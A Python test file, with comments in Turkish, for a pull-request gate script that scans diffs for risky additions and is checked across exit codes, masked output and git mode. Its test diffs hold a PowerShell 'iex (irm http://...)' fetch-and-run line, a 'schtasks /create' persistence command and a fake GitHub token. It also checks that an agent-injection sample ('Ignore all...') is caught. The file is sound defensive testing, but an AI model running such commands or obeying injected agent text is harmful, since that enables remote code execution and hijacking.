"""KL-06 PR kapisi (scripts/pr_kapi.py) demir cubuk testi.

  python -I tests/denetim/test_pr_kapi.py     -> son satir: TEST_PR_KAPI: N/N GECTI (cikis 0)

Her kural icin KOTU diff (pr_kapi.ornekler(): calisma aninda parcalardan uretilir; depoda kotu_*.diff dosyasi TUTULMAZ cunku bekci, gizlilik taramasi ve antivirus
bunlari gercek sanir; insan okumak isterse `pr_kapi.py --ornekleri-yaz DEPO_DISI_KLASOR`) hepsi CLI'dan gecirilir: KIRMIZI ornek cikis 1, SARI ornek cikis 0 + `SONUC: SARI`.
Ek: yalniz eklenen satirlar taranir; cikti beyaz liste ile suzulur (ESC/kontrol karakteri yok, sir ve ajan cumlesi basilmaz); kapi calismazsa yesil yok (cikis 6);
gercek PR #2 ve #3 (yerel gecmisten) KIRMIZI vermez, yalniz SARI. Kaynakta sir/gorunmez karakter yok; ag yok, GPU yok.
"""
import os, shutil, subprocess, sys, tempfile, unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from test_denetim import KOK   # noqa: E402

BETIK = os.path.abspath(os.environ.get('DENETIM_TEST_PRKAPI') or os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'scripts', 'pr_kapi.py'))


def pr(*arg, girdi=None, betik=None):
    p = subprocess.run([sys.executable, '-I', betik or BETIK] + list(arg), capture_output=True, input=girdi,
                       creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0))
    return p.returncode, p.stdout.decode('utf-8', 'replace'), p.stderr.decode('utf-8', 'replace')


def ornekler():
    spec = __import__('importlib.util').util.spec_from_file_location('pr_kapi_t', BETIK)
    m = __import__('importlib.util').util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m, m.ornekler()


class Kapi(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.mod, cls.orn = ornekler()

    def diff(self, metin, *ek, betik=None):
        with tempfile.TemporaryDirectory() as td:
            f = os.path.join(td, 'a.diff')
            open(f, 'w', encoding='utf-8', newline='\n').write(metin)
            return pr('--diff', f, *ek, betik=betik)

    def test_ozdenetim_gecer(self):
        rc, o, _ = pr('--ozdenetim')
        self.assertEqual(rc, 0, o); self.assertIn('SONUC: GECTI', o)

    def test_her_kotu_ornek_cli_ile_yakalanir(self):
        n = 0
        for ad, (metin, kural, sev) in self.orn.items():
            rc, o, _ = self.diff(metin)
            if kural is None:
                continue
            n += 1
            self.assertIn(kural, o, '%s: %s' % (ad, o))
            if sev == 'KIRMIZI':
                self.assertEqual(rc, 1, '%s: %s' % (ad, o)); self.assertIn('SONUC: KIRMIZI', o)
            else:
                self.assertEqual(rc, 0 if kural in ('korumali_yol', 'komb_mcp') else 4, '%s: %s' % (ad, o)); self.assertIn('SONUC: SARI-', o)
        self.assertGreaterEqual(n, 20)

    def test_her_kural_ailesi_en_az_bir_kirmizi_ornege_sahip(self):
        aile = {k for _, (_, k, s) in self.orn.items() if s == 'KIRMIZI'}
        self.assertTrue({'uzak_kod', 'kalicilik', 'dinleme', 'sir', 'ajan_enjeksiyon', 'gorunmez_unicode', 'ikili', 'ci_riski'} <= aile, aile)

    def test_iyi_ornekler_yesil(self):
        for ad, (metin, kural, _) in self.orn.items():
            if kural is None:
                rc, o, _ = self.diff(metin)
                self.assertEqual(rc, 0, '%s: %s' % (ad, o)); self.assertNotIn('KIRMIZI', o)

    def test_yalniz_eklenen_satirlar(self):
        silinen = 'diff --git a/docs/a.md b/docs/a.md\n--- a/docs/a.md\n+++ b/docs/a.md\n@@ -1,2 +1,1 @@\n-eski i' + 'ex satiri\n baglam sch' + 'tasks\n'
        rc, o, _ = self.diff(silinen)
        self.assertEqual(rc, 0, o); self.assertIn('SONUC: GECTI', o)

    def test_satir_numarasi_dogru(self):
        d = ('diff --git a/docs/a.md b/docs/a.md\n--- a/docs/a.md\n+++ b/docs/a.md\n@@ -10,2 +10,4 @@\n baglam\n+temiz\n-silinen\n+sch' + 'tasks /create\n son\n')
        rc, o, _ = self.diff(d)
        self.assertEqual(rc, 1, o); self.assertIn('docs/a.md:12', o)

    def test_cikti_maskeli_sir_ve_ajan_cumlesi_basilmaz(self):
        sir = 'gh' + 'p_' + 'A1b2C3d4' * 4 + 'WxYz'
        d = self.orn['kotu_sir_ghp'][0]
        self.assertIn(sir, d)
        rc, o, _ = self.diff(d)
        self.assertNotIn(sir, o); self.assertNotIn(sir[8:], o)
        rc, o, _ = self.diff(self.orn['kotu_ajan_enjeksiyon_agents'][0])
        self.assertNotIn('Ignore all', o); self.assertNotIn('setup script', o)
        self.assertIn('ajan_enjeksiyon', o)

    def test_cikti_beyaz_liste_kontrol_karakteri_yok(self):
        kotu_yol = 'scripts/\x1b[31mkirmizi\x07.ps1'
        d = 'diff --git a/%s b/%s\nnew file mode 100644\n--- /dev/null\n+++ b/%s\n@@ -0,0 +1,1 @@\n+i' % (kotu_yol, kotu_yol, kotu_yol) + 'ex ("a")\n'
        rc, o, e = self.diff(d)
        for ch in o + e:
            self.assertTrue(ch in '\n\r\t' or ord(ch) >= 32, 'kontrol karakteri ciktida: %r' % ch)
        self.assertNotIn('\x1b', o); self.assertEqual(rc, 1, o)

    def test_json_makine_okur(self):
        import json
        rc, o, e = self.diff(self.orn['kotu_kalicilik_setx'][0], '--json')
        j = json.loads(o)
        self.assertEqual(rc, 1); self.assertTrue(any(b['kural'] == 'kalicilik' and b['seviye'] == 'KIRMIZI' for b in j['bulgu']))
        self.assertIn('SONUC: KIRMIZI', e)

    def test_stdin(self):
        rc, o, _ = pr('--diff', '-', girdi=self.orn['kotu_uzak_kod_iex'][0].encode('utf-8'))
        self.assertEqual(rc, 1, o)

    def test_girdi_hatali_cikis_3(self):
        rc, o, _ = pr()
        self.assertEqual(rc, 3, o); self.assertIn('SONUC: GIRDI HATALI (3)', o)
        rc, o, _ = pr('--diff', os.path.join(tempfile.gettempdir(), 'yok_' + 'x' * 8 + '.diff'))
        self.assertEqual(rc, 3, o)

    def test_kapi_calismazsa_yesil_yok(self):
        # denetim.py yan yana degilse Unicode tablosu yuklenemez: kapi CALISMADI (cikis 6), asla GECTI degil
        with tempfile.TemporaryDirectory() as td:
            kopya = os.path.join(td, 'pr_kapi.py')
            shutil.copyfile(BETIK, kopya)
            rc, o, _ = self.diff(self.orn['iyi_belge'][0], betik=kopya)
            self.assertEqual(rc, 6, o); self.assertIn('SONUC: CALISMADI (6)', o); self.assertNotIn('GECTI', o)

    def test_ornekler_depo_icine_yazilmaz(self):
        rc, o, _ = pr('--ornekleri-yaz', os.path.join(KOK, 'ornek_cikis'))
        self.assertEqual(rc, 3, o); self.assertFalse(os.path.exists(os.path.join(KOK, 'ornek_cikis')))

    def test_ornekleri_depo_disina_yazar(self):
        with tempfile.TemporaryDirectory() as td:
            rc, o, _ = pr('--ornekleri-yaz', os.path.join(td, 'cikti'))
            self.assertEqual(rc, 0, o)
            adlar = os.listdir(os.path.join(td, 'cikti'))
            self.assertTrue(any(a.startswith('kotu_') for a in adlar) and any(a.startswith('iyi_') for a in adlar))

    # ---- git modu (taban..bas) sahte depoda
    def test_git_modu_kotu_pr(self):
        G = ['git', '-c', 'user.name=t', '-c', 'user.email=t@example.invalid', '-c', 'commit.gpgsign=false']
        with tempfile.TemporaryDirectory() as td:
            def g(*a):
                return subprocess.run(G + ['-C', td] + list(a), capture_output=True, creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0))
            g('init', '-q'); open(os.path.join(td, 'a.md'), 'w').write('x\n'); g('add', '.'); g('commit', '-q', '-m', 'taban')
            g('branch', '-M', 'main'); g('checkout', '-q', '-b', 'pr')
            os.makedirs(os.path.join(td, 'scripts')); open(os.path.join(td, 'scripts', 'k.ps1'), 'w').write('i' + 'ex (irm http://example.invalid)\n')
            g('add', '.'); g('commit', '-q', '-m', 'pr')
            rc, o, _ = pr('--taban', 'main', '--bas', 'pr', '--kok', td)
            self.assertEqual(rc, 1, o); self.assertIn('uzak_kod', o); self.assertIn('scripts/k.ps1:1', o)
            rc, o, _ = pr('--taban', 'yok_ref', '--bas', 'pr', '--kok', td)
            self.assertEqual(rc, 3, o)

    # ---- pozitif: gercek PR'lar (yerel gecmis; merge commit'in birinci ebeveyniyle farki = PR'in tamami)
    def test_pozitif_gercek_pr2_pr3(self):
        gordu = 0
        for merge in ('505e636', 'e5101a4'):
            ok = subprocess.run(['git', '-C', KOK, 'cat-file', '-e', merge + '^{commit}'], capture_output=True, creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0))
            if ok.returncode != 0:
                continue   # sig klon / gecmis yok: atla (CI'da)
            gordu += 1
            rc, o, _ = pr('--taban', merge + '^1', '--bas', merge, '--kok', KOK)
            self.assertEqual(rc, 0, '%s: %s' % (merge, o)); self.assertNotIn('KIRMIZI', o); self.assertIn('korumali_yol', o)
        if not gordu:
            self.skipTest('PR #2/#3 merge commit yerelde yok')


if __name__ == '__main__':
    r = unittest.TextTestRunner(verbosity=0, stream=sys.stderr).run(unittest.defaultTestLoader.loadTestsFromTestCase(Kapi))
    n = r.testsRun
    print('TEST_PR_KAPI: %d/%d %s' % (n - len(r.failures) - len(r.errors), n, 'GECTI' if r.wasSuccessful() else 'KIRIK'))
    sys.exit(0 if r.wasSuccessful() else 1)
